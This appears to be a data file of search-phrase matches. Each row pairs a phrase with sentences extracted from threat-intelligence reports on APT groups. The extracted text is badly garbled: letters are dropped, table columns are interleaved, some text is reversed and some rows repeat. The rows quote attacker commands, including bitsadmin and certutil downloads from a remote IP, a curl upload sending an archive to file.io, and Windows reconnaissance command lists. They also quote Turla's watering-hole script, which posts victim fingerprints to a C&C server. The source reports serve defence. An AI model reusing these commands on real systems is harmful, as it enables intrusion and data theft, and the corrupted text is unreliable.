browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
c89a6cfa1e6eb16768ede2ce52695f89,computer name,0.7631110073603482,"['versions of the RAT including the ability to start a 204 52 Unknown.', 'comand shel, control proceses and services, 256 32 Nulterminated computername(if upload/download files, terminate TCP conections, sucesfulyobtainedfromthesystem).', 'createuseracounts, retrievesystem information, log 28 12 Procesname.', 'useractivity(viakeyloger), modifytimestamps on 30 52 0x0 bytes inalobserved files, conduct proces injection, conduct denial of comunications.', 'service atacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnexB).', 'computer.', 'Comands suported by the XShel softwarearelisted inAnexC.', '(XTiger) 38 72 0x0 bytes inalobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theproces svchost.exe isagenerichostprocesforservices 476 4 Tick count(repeated).']"
43c4d451e00c987d975ae5ee42e9c930,domain fronting,0.8688512556794599,"['SilverFish Group Threat Actor Report TLP:WHITE SilverFishAPTGroup Contents References 2 1 Introduction 3 1.1 InvestigationTimeline .', '.', '.', '.', '.', '.', '.']"
3af34358f61650bfa5d23d79f9018baf,domain fronting,0.8688512556794599,"['SilverFish Group Threat Actor Report TLP:WHITE SilverFishAPTGroup Contents References 2 1 Introduction 3 1.1 InvestigationTimeline .', '.', '.', '.', '.', '.', '.']"
cafca49c94ba7bff121f0156bd1d0890,a reverse proxy,0.8045018487462174,"['While HyperBro was frequently used, the atackers also used the PlugX/Korplug Trojan as a payload at times.', 'Other tols used in recent atacks include: Cobalt Strike: An of-the-shelf tol that can be used to load shelcode onto victim machines.', 'It has legitimate uses as a penetration testing tol but is frequently exploited by malicious actors.', 'LaZagne: A publicly available credential dumping tol.', 'IOX: A publicly available proxy and port-forwarding tol.', 'Fast Reverse Proxy (FRP): A reverse proxy tol.', 'Fscan: A publicly available intranet scaning tol.', 'Conclusion Budworm is known for mounting ambitious atacks against high-value targets.', 'While there were frequent reports of Budworm targeting U.S. organizations six to eight years ago, in more recent years the groups activity apears to have ben largely focused on Asia, the Midle East, and Europe.', 'However this is the second time in recent months, Budworm has ben linked to atacks against a U.S-based target.', 'A recent CISA report on multiple APT groups atacking a defense sector organization mentioned Budworms tolset.']"
2deb306cdb63e3244e00bbb0b6337d93,registry run key persistence implementation,0.7789044378979427,"[']online:843 185[.', ']175.158.27 : 1/2 %PUBLIC%\\ignit.vbs %PUBLIC%\\Favorites\\desktop.ini %PUBLIC%\\Libraries\\core.dl %APDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Prefetch.lNk wscript.exe /B /E:vbs C:\\Users\\Public\\Favorites\\desktop.ini C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U C:\\Users\\Public\\Libraries\\core.dl MicroBackdor is a publicly available backdor program developed using the C + programing language.', 'Author: cr4sh (aka Dmytro Oleksiuk).', 'Functional: id, info, ping, exit, upd, uninst, exec, shel, flist, fget, fput, screnshot (implemented separately by members of the group UAC-051 / unc151).', 'The server part is designed using the Python programing language and provides a simple web interface for managing bots.', 'Persistence: Run Windows Registry Key.', 'Comunication betwen the bot and the server is encrypted using RC4.', 'Graphic images Fig.', '1 Example of malicious files and image baits 2/2']"
01be204435044a83ae8553bc754a2b98,such as Mimikatz,0.7901490618778985,"['2013 CVE-2013-063 CVE- 2013-0634 (Ladyboyle)1.23 2016 4 (Symantec) (Tick) 4, 1 LAC .5 2017 6 (SecureWorks) (Bronze Butler)6 , 7 7 1 8 .', '2018 6 42 USB .9 2014 .', '208 .', 'IT .', ', USB .', '.', '.', '1 htps:/w.symantec.com/conect/blogs/adobe-zero-day-used-ladyboyle-atack 2 htps:/w.fireye.com/blog/threat-research/2013/02/lady-boyle-comes-to-town-with-a-new-exploit.html 3 htps:/asec.ahnlab.com/912 4 htps:/w.symantec.com/conect/blogs/tick-cyberespionage-group-zeros-japan 5 htps:/w.lac.co.jp/english/report/2016/1/04_cgview_01.html 6 htps:/w.secureworks.com/research/bronze-butler-targets-japanese-busineses 7 htps:/unit42.paloaltonetworks.com/unit42-tick-group-continues-atacks/ 8 htps:/blog.trendmicro.com/trendlabs-security-inteligence/redbaldknight-bronze-butler-daserf-backdor-now-using- steganography/ 9 htps:/unit42.paloaltonetworks.com/unit42-tick-group-weaponized-secure-usb-drives-target-air-gaped-critical-systems/ AhnLab, Inc. Al rights reserved.', '3 Analysis Report_Tick Group 2014 .', ', , , , , , , IT .', ', MS , .']"
d5019121cbc645eb0787efab173a12b3,such as Mimikatz,0.7901490618778985,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
d5019121cbc645eb0787efab173a12b3,such as Mimikatz,0.7901490618778985,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
31347d89b18461f35448b26fefb00133,"Using cmd.exe,",0.8780822903535888,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
399c17d5f44d8b855c9751aae73f3c11,"Using cmd.exe,",0.784826924155356,"['These files provide sequential execution of comands using algorithmic structures such as conditional operators and lops.', 'Seing as how cmd.exe is employed by atackers in a large number of cases and overlaps with other techniques of the MITRE AT&CK matrix, here we wil examine only a few examples of cmd.exe use at diferent stages of an atack without delving to dep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their coresponding techniques.', 'Examples of procedures Example 1 Lateral Tol Transfer via SMB.', 'Atackers use the copy comand to copy the contents of the curent folder to a remote host (the copied files contain the tols and malware that the atacker neds): $system32\\cmd.exe /C copy * \\<remote_ip>\\C$\\windows\\help\\help Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 90 Example 2 After gaining aces to the system, the atackers conduct reconaisance.', 'Similar to the procedures in the described incidents, the operator executes reconaisance comands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Atackers use cmd.exe to run their malware: cmd /c $system32\\conhost64.exe Example 4 Atackers use cmd.exe to download the tols that they wil use in subsequent stages of an atack to the compromised system: cmd.exe /c bitsadmin /transfer n hxp:/8.210.141[.', ']104:809/1.txt $public\\Downloads\\1.txt cmd.exe /c certutil -urlcache -split -f hxp:/8.210.141[.', ']104:809/MEUpdate.exe $windir\\Help\\Help\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 91 Example 5 Operators exfiltrate the colected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\1.rar"" -sl-no-revoke htps:/file.io Example 6 Atackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Execution TA02 | Comand and Scripting Interpreter: Windows Comand Shel T1059.03 Contents 92 The script gathers data on the system and saves this data to files, then ads them to an archive.', 'Here are al the reconaisance comands employed in the script: ver > :\\Windows\\Web\\systeminfo.txtb time /t > :\\Windows\\Web\\systeminfo.txtb date /t > :\\Windows\\Web\\systeminfo.txtb hostname > :\\Windows\\Web\\systeminfo.txtb systeminfo > :\\Windows\\Web\\systeminfo.txtb net localgroup Administrators > :\\Windows\\Web\\systeminfo.txtb ipconfig /al > :\\Windows\\Web\\systeminfo.txtb tasklist /v > :\\Windows\\Web\\systeminfo.txtb tasklist -svc > :\\Windows\\Web\\systeminfo.txtb net start > :\\Windows\\Web\\systeminfo.txtb ping w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb tracert -h 5 w.yandex.ru > :\\Windows\\Web\\systeminfo.txtb netstat -aon > :\\Windows\\Web\\systeminfo.txtb netstat -bv > :\\Windows\\Web\\systeminfo.txtb net use > :\\Windows\\Web\\systeminfo.txtb net share > :\\Windows\\Web\\systeminfo.txtb net view > :\\Windows\\Web\\systeminfo.txtb net view /domain > :\\Windows\\Web\\systeminfo.txtb net group /domain > :\\Windows\\Web\\systeminfo.txtb net user > :\\Windows\\Web\\systeminfo.txtb net user /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain controlers"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain admins"" /domain > :\\Windows\\Web\\systeminfo.txtb net group ""domain computers"" /domain > :\\Windows\\Web\\systeminfo.txtb nltest /domain_trusts > :\\Windows\\Web\\systeminfo.txtb route print > :\\Windows\\Web\\systeminfo.txtb arp -a > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\program files\\*.', '*"" > :\\Windows\\Web\\systeminfo.txtb dir /a ""c:\\Program Files (x86)\\*.']"
6676698d65e372feb79c0159d9d2b11e,"Using cmd.exe,",0.8780822903535888,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
e7e7273d3f44e0de9f328a24d118c6bd,a heavily obfuscated script,0.8074349033333801,"['2/1/2020 Ransomware, Trojan and Miner together against PIK-Group Marco Ramili Web Corner Ransomware, Trojan and Miner together against PIK-Group marcoramili.com/2019/02/28/ransomware-trojan-and-miner-together-against-pik-group View al posts by marcoramili February 28, 2019 When an unknown sender sugests me to click on a super wired url, droping a ZIP file straight in my box, by saying its geting the next targeted atack on a huge company, wel I kinda loking forward to it !', 'So I clicked on the link (se IOC section) and Ive downloaded a pik.zip file.', 'The zip file wraped out an interesting cyrilic loking javascript file named: , which acording to gogle translate would be: PIK Group of Companies order details.', 'It loks like a crafted file for PIK-Group ,one of the most important real estate companies based in Rusia with more then 14k employes !', 'By analysing such a script its clear that it wont be a piece of cake.', 'The script is heavily obfuscated with more techniques.', 'As you might apreciate from Stage0 (folowing image) there are two main obfuscation streams: the first one is implemented by introducing fake static forks such as: if and cases and the second one is implemented by dynamicaly building function blocks from nested strings which are either dynamicaly built and separated into multiple concatenation steps.', 'Javascript Stage0 The script eventualy drops and executes (Stage0 Execution phase folows) a fake image file (msg.jpg) which actualy is an UPX packet windows PE acting as second stage.', 'The second stage drops and executes thre aditional modules: a backdor, a Miner and finaly a quite known Ransomware.', 'It actualy weird to understand the atackers neds, at such point, why so many diferent actors in an unique atack ?', 'Stage0 Execution Acording to pcrisk, the first downloaded module (327B0EF4.exe) loks like a wel-known Troldesh Ransomware.']"
e7e7273d3f44e0de9f328a24d118c6bd,a heavily obfuscated script,0.8074349033333801,"['2/1/2020 Ransomware, Trojan and Miner together against PIK-Group Marco Ramili Web Corner Ransomware, Trojan and Miner together against PIK-Group marcoramili.com/2019/02/28/ransomware-trojan-and-miner-together-against-pik-group View al posts by marcoramili February 28, 2019 When an unknown sender sugests me to click on a super wired url, droping a ZIP file straight in my box, by saying its geting the next targeted atack on a huge company, wel I kinda loking forward to it !', 'So I clicked on the link (se IOC section) and Ive downloaded a pik.zip file.', 'The zip file wraped out an interesting cyrilic loking javascript file named: , which acording to gogle translate would be: PIK Group of Companies order details.', 'It loks like a crafted file for PIK-Group ,one of the most important real estate companies based in Rusia with more then 14k employes !', 'By analysing such a script its clear that it wont be a piece of cake.', 'The script is heavily obfuscated with more techniques.', 'As you might apreciate from Stage0 (folowing image) there are two main obfuscation streams: the first one is implemented by introducing fake static forks such as: if and cases and the second one is implemented by dynamicaly building function blocks from nested strings which are either dynamicaly built and separated into multiple concatenation steps.', 'Javascript Stage0 The script eventualy drops and executes (Stage0 Execution phase folows) a fake image file (msg.jpg) which actualy is an UPX packet windows PE acting as second stage.', 'The second stage drops and executes thre aditional modules: a backdor, a Miner and finaly a quite known Ransomware.', 'It actualy weird to understand the atackers neds, at such point, why so many diferent actors in an unique atack ?', 'Stage0 Execution Acording to pcrisk, the first downloaded module (327B0EF4.exe) loks like a wel-known Troldesh Ransomware.']"
426b1da27b5ce1ffb4f7863fd4d1bed8,obfuscated JavaScript code,0.764649258713624,"['If the user is not in the Pakistani IP range, the server returns an 8-byte RTF file (file.rtf) that contains a single string: {\\rtf1 }.', 'However, if the user is within the Pakistani IP range, the server then returns the RTF payload, which varies betwen 406KB 414KB in size.', '7/15 Figure 6: ""file.rtf"" malicious payload Loader Having listed the existing objects in the file.rtf file that was obtained from paknavy-gov- pk[.]downld[.', ']net domain, the 1.a object was extracted for further analysis.', 'Figure 7: ""1.a"" object overview During the malware execution chain, this object is saved under the C:\\Users\\user\\ApData\\Local\\Temp\\1.a location on the victims machine.', 'The 1.a file is an obfuscated JavaScript.', '8/15 Figure 8: De-obfuscated strings There are two things that stand out from our analysis the base64 encoded data blob, and two URLs.', 'The base64 data blob decodes to Win32 DL(Ap.dl), and the two URLs are used for further comunications with the threat actor.', 'Figure 9: URLs used for further comunications with SideWinder Agent The previously mentioned base64 encoded data blob is a .NET compiled Win32 DL caled Ap.dl.', 'Hashes (md5, 8934f2ed2d4390f2e6170e4cfdbd483 sha-256) 8b718a15f76768ba29849a5f4a6ca0f1d9c8ba7bcdc9d89efc792fe20e9fdb5 ITW File Name Ap.dl Compilation Fri Nov 16 02:26:21 2074 Stamp File DL Type/Signature File Size 13939 (bytes) Compiler Microsoft Visual C# / Basic .NET Name/Version 9/15 To further avoid static signature-based detection, the Ap.dl file is obfuscated in the same way as the majority of other files and scripts uncovered in this campaign.', 'Figure 10: ""Ap.dl"" file The Ap.dl file is launched by earlier stage JavaScript code.']"
17331bbb038c6cb277bae3b9e7d84c6c,sent as a POST request,0.783503804615588,"['It uses multiple storage places such as the local database, local shared objects (Flash cokies), Silverlight storage, etc., to store the cokie value.', 'In comparison to a regular cokie, it wil be much more persistent as it wont be deleted if the user just deletes the browsers cokies.', 'This evercokie wil be used to track whether the user visits one of the compromised websites again.', 'When the user comes back for a second time, the previously stored MD5 value wil be used to identify them.', 'Then, it colects several pieces of information including the browser plugin list, the scren resolution and various operating system information.', 'This is sent to the C&C server in a POST request.', 'If there is a reply, it is asumed to be JavaScript code and is executed using the eval function.', ""1 [] 2 function f_ec(){ 3 var ec = new evercokie({domain:'htp:/skategirlchina[."", ""]com/wp- includes/data_from_db_top.php',baseurl:'?htp:/skategirlchina[."", ']com/wp- 4 includes/data_from_db_top.php\'}); 5 ec.get(""ec"", function(value) { htps:/w.welivesecurity.com/2020/03/12/tracking-turla-new-backdor-armenian-watering-holes/ 2/10 3/13/2020 Tracking Turla: New backdor delivered via Armenian watering holes | WeLiveSecurity 6 if (value!=undefined){ 7 var jsonText = {\'ec\': \'+value+\', 8 \'scp\':scren.pixelDepth=undefined?', ""'+0+':'+scren.pixelDepth+ ', 9 'scw':'+scren.width+', 10 'sch':'+scren.height+', 1 'bn':'+bn+', 12 'bv':'+bv+', 13 'bc':'+bc+', 14 'osn':'+osn+', 15 'osv':'+osv+', 16 'osc':'+osc+', 17 'adr':'+adr+', 18 'pdr':'+pdr+', 19 'fla':'+fla+', 20 'jav':'+jav+', 21 'wmp':'+wmp+', 2 'msw':'+msw+', 23 'qui':'+qui+', 24 'sho':'+sho+', 25 'type':'info', 26 'tiz': '+(new Date().getTimezoneOfset()/60)+' 27 }; 28 var json = JSON.stringify(jsonText); 29 ajax({ 30 content_type : 'aplication/json', 31 url: 'htp:/skategirlchina[.]com/wp-includes/data_from_db_top.php?""]"
17331bbb038c6cb277bae3b9e7d84c6c,sent as a POST request,0.783503804615588,"['It uses multiple storage places such as the local database, local shared objects (Flash cokies), Silverlight storage, etc., to store the cokie value.', 'In comparison to a regular cokie, it wil be much more persistent as it wont be deleted if the user just deletes the browsers cokies.', 'This evercokie wil be used to track whether the user visits one of the compromised websites again.', 'When the user comes back for a second time, the previously stored MD5 value wil be used to identify them.', 'Then, it colects several pieces of information including the browser plugin list, the scren resolution and various operating system information.', 'This is sent to the C&C server in a POST request.', 'If there is a reply, it is asumed to be JavaScript code and is executed using the eval function.', ""1 [] 2 function f_ec(){ 3 var ec = new evercokie({domain:'htp:/skategirlchina[."", ""]com/wp- includes/data_from_db_top.php',baseurl:'?htp:/skategirlchina[."", ']com/wp- 4 includes/data_from_db_top.php\'}); 5 ec.get(""ec"", function(value) { htps:/w.welivesecurity.com/2020/03/12/tracking-turla-new-backdor-armenian-watering-holes/ 2/10 3/13/2020 Tracking Turla: New backdor delivered via Armenian watering holes | WeLiveSecurity 6 if (value!=undefined){ 7 var jsonText = {\'ec\': \'+value+\', 8 \'scp\':scren.pixelDepth=undefined?', ""'+0+':'+scren.pixelDepth+ ', 9 'scw':'+scren.width+', 10 'sch':'+scren.height+', 1 'bn':'+bn+', 12 'bv':'+bv+', 13 'bc':'+bc+', 14 'osn':'+osn+', 15 'osv':'+osv+', 16 'osc':'+osc+', 17 'adr':'+adr+', 18 'pdr':'+pdr+', 19 'fla':'+fla+', 20 'jav':'+jav+', 21 'wmp':'+wmp+', 2 'msw':'+msw+', 23 'qui':'+qui+', 24 'sho':'+sho+', 25 'type':'info', 26 'tiz': '+(new Date().getTimezoneOfset()/60)+' 27 }; 28 var json = JSON.stringify(jsonText); 29 ajax({ 30 content_type : 'aplication/json', 31 url: 'htp:/skategirlchina[.]com/wp-includes/data_from_db_top.php?""]"
3deeea9c526adc0af24d339cce201ec9,The threat actors used C:\MS_DATA as their main working directory for storing malware and staging data for exfiltration,1.0,"['APT41 is also known to target telecomunication providers.', 'Given previous target and TP overlaps, and an evident familiarity with victim environments, we ases with medium- confidence that Galium is involved.', 'However, we also recognize the posibility of closed-source tol-sharing betwen Chinese state-sponsored threat actors, and the posibility of a shared vendor or digital quartermaster.', 'Regardles of clustering specifics, this finding highlights the increased operational tempo of Chinese cyberespionage actors and their consistent investment in advancing their malware arsenal to evade detection.', 'Infection Vector and Initial TPs As initial atack indicators, we observed comand execution through webshels on compromised Microsoft Exchange server deployments.', 'The threat actors used C:\\MS_DATA as their main working directory for storing malware and staging data for exfiltration.', 'Noting that the Microsoft TroubleShotingScript tolset (TSv2) uses C:\\MS_DATA for storing log files, we suspect that its use as a working directory is an atempt to make malicious file system activities lok legitimate.', 'After establishing an initial fothold, the threat actor conducts reconaisance like querying user and network information using a variety of tols.', 'For example, the atackers used dsquery and query to obtain information about Active Directory objects, including user information, and Remote Desktop user sesions.', 'They also used the Local Group (LG) tol to enumerate al local groups and members in a domain.', '""cmd"" /c cd /d C:\\MS_DATA\\&dsquery * -limit 0 -filter ""cmd"" /c cd /d C:\\MS_DATA\\&dsquery * -limit 0 -filter ""&(objectClas=User) (objectCategory=Person)"" -atr objectSID sAMAcountName displayName mail memberOf >da.back&cd ""cmd"" /c cd /d c:\\windows\\system32\\inetsrv\\&query user&cd ""cmd"" /c cd /d C:\\MS_DATA\\&lg.exe \\[IP ADRES] -lu >169.txt&cd The atackers then check conectivity with both the Internet and specific local machines of interest.']"
31347d89b18461f35448b26fefb00133,"""cmd""  /c",0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,"""cmd""  /c",1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,"""cmd""  /c",0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
31347d89b18461f35448b26fefb00133,"cmd""  /c",0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,"cmd""  /c",1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,"cmd""  /c",0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
3e9312913ace03550c810e6b92ab1d61,tasklist,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,tasklist,1.0,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
c7c9dc3d3f903b2ce98ced8a8e8576c2,"stealer,",0.8873195225012482,"['We believe that MoustachedBouncer uses a lawful interception system (such as SORM) to conduct its AitM operations.', 'We ases with low confidence that MoustachedBouncer is closely coperating with Winter Vivern, another group targeting European diplomats but using diferent TPs.', 'Since 2014, the group has ben operating a malware framework that we have named NightClub.', 'It uses the SMTP and IMAP (email) protocols for C&C comunications.', 'Starting in 2020, the group has ben using, in paralel, a second malware framework we have named Disco.', 'Both NightClub and Disco suport aditional spying plugins including a screnshoter, an audio recorder, and a file stealer.', 'Victimology Acording to ESET telemetry, the group targets foreign embasies in Belarus, and we have identified four diferent countries whose embasy staf have ben targeted: two from Europe, one from South Asia, and one from Africa.', 'The key dates are shown in Figure 1.', '1/20 Figure 1.', 'Timeline of MoustachedBouncer activities Atribution While we track MoustachedBouncer as a separate group, we have found elements that make us ases with low confidence that they are closely colaborating with another group known as Winter Vivern.', 'The later was discovered in 2021 and is stil active as of 2023.']"
8be76b8e09117447731108cd5189e509,"stealer,",0.7569466836912052,"[""It's likely target is the Tencent Q chat aplication."", 'File stealer.', 'Has a configuration file that enables the colection of files from diferent sources: HDs, sebasek.dl USB thumb drives, and CD-ROMs; as wel as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be betwen a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dl key.', 'pRsm.dl Captures input and output audio streams.', 'Credential stealer.', 'mailLFPasword.dl Steals credentials from Outlok and Foxmail email client software.', 'Credential stealer.', 'agentpwd.dl Steals credentials from Chrome, Opera, Firefox, Foxmail, QBrowser, FileZila, and WinSCP, among others.', 'A complex plugin designed to steal the content from the Tencent Q database that qmsdp.dl stores the users mesage history.', 'This is achieved by in-memory patching of the software component KernelUtils.dl and droping a fake userenv.dl DL.']"
8be76b8e09117447731108cd5189e509,"stealer,",0.8873195225012482,"['It is important to note that the plugins dont have unique internal identification numbers; therefore we are identifying them here by their DL names on disk, which we have never sen change.', 'Table 2.', 'List of plugin DL files Plugin DL name Overview Keyloger.', 'Kstrcs.dl It only actively logs keystrokes when the foreground window belongs to a proces named Q.exe and the window title matches QEdit.', ""It's likely target is the Tencent Q chat aplication."", 'File stealer.', 'Has a configuration file that enables the colection of files from diferent sources: HDs, sebasek.dl USB thumb drives, and CD-ROMs; as wel as criteria based on the file properties: filename must contain a keyword from a predefined list, file size must be betwen a defined a minimum and maximum size.', 'Captures text copied to the clipboard and logs information from the USBSTOR registry Cbmrpa.dl key.', 'pRsm.dl Captures input and output audio streams.', 'Credential stealer.', 'mailLFPasword.dl Steals credentials from Outlok and Foxmail email client software.']"
920bbf3f4cf30cf9c556531074485448,"stealer,",0.815017922881167,"['25 EDR/Security bypas tols .', '27 Comand file tol .', '29 Incident investigation .', '30 Technical details part 2.', 'In-the-field analysis results.', '.', '31 Linux MATA generation 3 .', '32 Discovery .', '32 Lateral movement .', '32 Abusing security compliance solution .', '3 Abusing the anti-malware solution .']"
